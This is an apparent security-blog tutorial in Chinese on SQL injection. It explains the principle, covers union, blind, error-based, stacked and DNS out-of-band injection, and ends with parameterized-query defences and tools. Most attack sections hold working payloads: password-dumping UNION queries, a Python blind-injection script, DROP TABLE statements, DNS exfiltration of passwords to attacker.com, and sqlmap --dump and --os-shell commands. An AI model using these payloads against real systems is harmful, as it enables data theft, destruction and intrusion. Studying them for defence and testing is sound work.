---
title: "SQL注入漏洞详解"
description: "全面讲解SQL注入漏洞原理、类型、利用方法与防御方案"
pubDate: 2026-05-18
heroImage: ""
tags: ["漏洞原理", "SQL注入", "Web安全"]
category: "kb"
severity: "high"
cve: ""
vul_type: "Injection"
---

# SQL注入漏洞详解

## 漏洞原理

SQL注入（SQL Injection）是由于程序对用户输入的数据没有做充分的过滤，直接拼接进SQL语句执行，导致用户可以通过构造恶意输入来改变原有SQL语句的逻辑，进而执行任意SQL命令。

**核心问题：** 数据被当作代码执行

```sql
-- 正常查询（用户输入 id=1）
SELECT * FROM users WHERE id=1;

-- 被注入后（用户输入 id=1 OR 1=1）
SELECT * FROM users WHERE id=1 OR 1=1;
-- 结果：返回所有用户记录！
```

---

## SQL注入类型

### 1. Union 联合查询注入

利用 `UNION` 合并两个查询结果集。

```sql
-- 爆库名
' UNION SELECT 1,database(),3,4--

-- 爆表名
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables--

-- 爆字段名
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'--

-- 爆数据
' UNION SELECT 1,username,password,4 FROM users--
```

### 2. 布尔盲注（Boolean-Based Blind）

页面不返回数据，只返回 True/False。

```sql
-- 判断长度
' AND LENGTH(database())>5--

-- 逐字符猜解
' AND ASCII(SUBSTRING((SELECT database()),1,1))>97--

-- Python脚本自动化
import requests
url = "http://target.com/article?id=1"
result = ""
for i in range(1, 20):
    for j in range(32, 127):
        payload = f"' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{i},1))={j}--"
        r = requests.get(url + payload)
        if "存在" in r.text:
            result += chr(j)
            print(f"[+] {result}")
            break
```

### 3. 时间盲注（Time-Based Blind）

利用 `SLEEP()` 或 `BENCHMARK()` 延时函数判断条件。

```sql
-- MySQL时间盲注
' AND IF(1=1,SLEEP(5),0)--

-- 如果条件为真，延时5秒
' AND IF(SUBSTRING((SELECT password),1,1)='a',SLEEP(3),0)--

-- MSSQL时间盲注
'; IF 1=1 WAITFOR DELAY '0:0:5'--
```

### 4. 报错注入（Error-Based）

利用数据库报错信息回显数据。

```sql
-- MySQL 报错注入（UPDATEXML）
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--

-- MySQL 报错注入（EXTRACTVALUE）
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--

-- Oracle 报错
' AND CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))--
```

### 5. 堆叠注入（Stacked Queries）

多条SQL语句堆叠执行。

```sql
'; INSERT INTO users(username,password) VALUES('hacker','123456')--
'; DROP TABLE users--
```

### 6. DNS外带注入（Out-of-Band）

利用DNS请求外带数据（MySQL LOAD_FILE）。

```sql
-- MySQL DNS外带
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\test'))--

-- MSSQL DNS外带
'; DECLARE @host varchar(1024); SET @host=(SELECT password FROM users+'.attacker.com'); EXEC('master..xp_dirtree''\\'+@host+'\foo');--
```

---

## 常用注入函数

| 数据库 | 关键函数 |
|--------|---------|
| MySQL | `SLEEP()`, `BENCHMARK()`, `LOAD_FILE()`, `INTO OUTFILE` |
| MSSQL | `WAITFOR DELAY`, `OPENROWSET`, `xp_cmdshell` |
| PostgreSQL | `PG_SLEEP()`, `COPY`, `dblink` |
| Oracle | `UTL_HTTP`, `CTXSYS.DRITHSX.SN` |

---

## 防御方案

```python
# Python 安全查询示例
# 1. 参数化查询（最有效）
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))

# 2. 白名单校验
ALLOWED_CHARS = set('abcdefghijklmnopqrstuvwxyz0123456789_')
if not set(user_input).issubset(ALLOWED_CHARS):
    raise ValueError("Invalid input")

# 3. 转义处理
import sqlite3
conn = sqlite3.connect("app.db")
cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))

# 4. Web应用防火墙（WAF）
# ModSecurity / 宝塔WAF / 阿里云WAF
```

---

## 自动化工具

| 工具 | 用途 |
|------|------|
| **sqlmap** | 全自动SQL注入检测与利用 |
| **BurpSuite** | 手动注入测试 |
| **Havij** | GUI化SQL注入工具 |
| **Pangolin** | 国产SQL注入工具 |

```bash
# sqlmap 基本用法
sqlmap -u "http://target.com/product?id=1" --batch
sqlmap -u "http://target.com/product?id=1" --dbs
sqlmap -u "http://target.com/product?id=1" -D dbname --tables
sqlmap -u "http://target.com/product?id=1" -D dbname -T users --dump
sqlmap -u "http://target.com/product?id=1" --os-shell
```
